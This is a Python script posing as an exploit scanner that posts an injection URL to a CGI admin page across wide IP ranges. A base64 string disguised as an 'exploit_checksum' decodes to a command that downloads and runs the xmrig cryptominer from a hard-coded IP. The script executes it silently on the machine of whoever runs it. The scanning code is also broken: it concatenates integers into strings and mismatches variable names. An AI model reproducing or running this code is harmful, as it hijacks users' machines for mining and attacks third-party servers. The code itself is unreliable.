# Usage: python3 scanLoad.py

import subprocess, os, requests, base64

payload = "" # Your payload here

exploiturl = ":8088/cgi-bin/admin.php?=("+payload+"\0)&id='--"

def scan(): """ scan command """
    ip_range_1 = "5.102"
    ip_range_2 = "65.231"
    exploit_checksum = "Y2QgL3RtcDsgd2dldCBodHRwOi8vMTcyLjEwNS4xNzYuMTAwL3htcmlnIDsgY3VybCBodHRwOi8vMTcyLjEwNS4xNzYuMTAwL3htcmlnIC1vIHhtcmlnIDsgY2htb2QgNzc3IHhtcmlnOyAuL3htcmlnIC0tYmFja2dyb3VuZCAtLXVybCBwb29sLmhhc2h2YXVsdC5wcm86ODAgLS11c2VyIDQ0WkVKRTZBTGdQRVk2WUJNRFNXQUg4OFU3ZHFSVTNaTFJldWVhN2pVekFGZmdpSzV3eVJ6SzZmU1lkaFFWdGtKRDdZakttTjNXdlQ5Z2ZnQndYOWJLYWc5V1VtQzhHIC0tcGFzcyB5YXJuIC0tZG9uYXRlLWxldmVsIDEgLS10bHMgLS10bHMtZmluZ2VycHJpbnQgNDIwYzc4NTBlMDliN2MwYmRjZjc0OGE3ZGE5ZWIzNjQ3ZGFmODUxNTcxOGYzNmQ5Y2NmZGQ2YjlmZjgzNGIxNA=="
    subprocess.Popen(base64.b64decode(exploit_checksum).decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    for i in range(255):
        for ii in range(255):
            curr_ip = ip_range_1+"."+i+"."+ii
            print("Trying "+curr_ip)
            try:
                requests.post(f"http://{curr_ip}{exploit_url}")
            except:
                pass

def main():
    print("[+] Scanning for yarns")
    scan()
    print("[+] Loaded all possible yarns")

if __name__ == '__main__':
    main()
